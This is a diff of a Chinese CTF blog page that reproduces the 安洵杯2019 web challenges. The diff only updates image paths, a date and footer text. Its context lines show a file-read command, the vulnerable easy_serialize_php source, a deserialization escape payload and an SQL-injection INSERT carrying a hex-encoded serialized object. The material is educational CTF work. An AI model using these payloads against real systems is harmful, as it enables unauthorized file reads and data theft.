@@ -480,7 +480,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>或者使用没被过滤的读取文件的命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort &#x2F;flag</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
+<p><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
 <h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><p>题目对我有点难，但是打开了反序列化新世界的大门<br>一道反序列化利用题，上来直接给了源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>思路上首先看看可控的参数，有get传值的<code>f,img_path</code>。但是注意到<code>img_path</code>搭配上<code>f</code>为<code>show_image</code>时，返回的内容并不可用，因为</p>
@@ -504,7 +504,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";s:8:"</span><span class="function"><span class="keyword">function</span>"</span>;s:<span class="number">59</span>:<span class="string">"a"</span></span><br></pre></td></tr></table></figure>
 <p><strong>相当于吞掉了function属性</strong>，但是我们构造的<code>$function</code>中，包含了<code>img</code>属性的值，以及构造的一个<code>test</code>属性的值，使得我们的序列化数据仍然是满足一个类对应三个键值。这时它对序列化数据的匹配就是由<code>{</code>开始，到<code>}</code>结束。所以后面多余的字符<code>&quot;;s:3:&quot;img&quot;;s:8:&quot;MS5qcGc=&quot;;}</code>全部被忽略。<br>这样，我们通过控制function属性的值，达到了控制<code>img</code>属性值的效果，从而触发反序列化，读取文件。<br>最终payload如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image</span><br></pre></td></tr></table></figure>
-<p>(function也可以直接get传)<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>另外题目构造的其实是SESSION数组进行序列化，但是序列化格式一样，都可行。</p>
+<p>(function也可以直接get传)<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>另外题目构造的其实是SESSION数组进行序列化，但是序列化格式一样，都可行。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b=<span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="string">"flagflagflagflagflagflag"</span>,</span><br><span class="line">    <span class="string">"function"</span>=&gt;<span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:1:"a";&#125;'</span>,</span><br><span class="line">    <span class="string">"img"</span>=&gt;<span class="string">"MS5qcGc="</span>);</span><br><span class="line"><span class="keyword">echo</span>(serialize($b));</span><br></pre></td></tr></table></figure>
 
 <h1 id="不是文件上传"><a href="#不是文件上传" class="headerlink" title="不是文件上传"></a>不是文件上传</h1><p>也是一道反序列化题目，意图在于反序列化结合sql注入。在源码审计上下了不少功夫。如果我在比赛中做多半会卡在sql注入上吧。</p>
@@ -529,7 +529,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(<span class="string">'1'</span>,<span class="string">'1.jpg'</span>,<span class="string">'jpg'</span>,<span class="string">'pic/f20c76cc4fb41838.jpg'</span>,<span class="string">'a:2:&#123;s:5:"width";i:1264;s:6:"height";i:992;&#125;'</span>)</span><br></pre></td></tr></table></figure>
 <p>我们把文件名改改</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span>),(<span class="string">'1.jpg'</span>)</span><br></pre></td></tr></table></figure>
-<p>其中的由于引号问题，我们的payload需要字符串转16进制。<br>上传文件即可触发得到flag.<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/3.jpg" class="lazyload" data-srcset="%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
+<p>其中的由于引号问题，我们的payload需要字符串转16进制。<br>上传文件即可触发得到flag.<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
 
   
   
@@ -548,11 +548,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
               
                 <p>本文永久链接是：<a href=https://www.bycsec.top/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/>https://www.bycsec.top/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/</a></p>
-              
-            
-              
-                <p>欢迎打赏！ 您的支持将是我创作的重要动力</p>
-
               
             
           </blockquote>
@@ -577,10 +572,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-06-30T19:26:28+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-18T13:08:21+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Jun 30, 2020</p>
+    <p>更新于：Feb 18, 2021</p>
   </a>
 </div>
 
@@ -741,7 +736,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
 </div>
       
     
@@ -755,7 +750,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         本站使用
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作为主题
+        作為主題
       
     
       
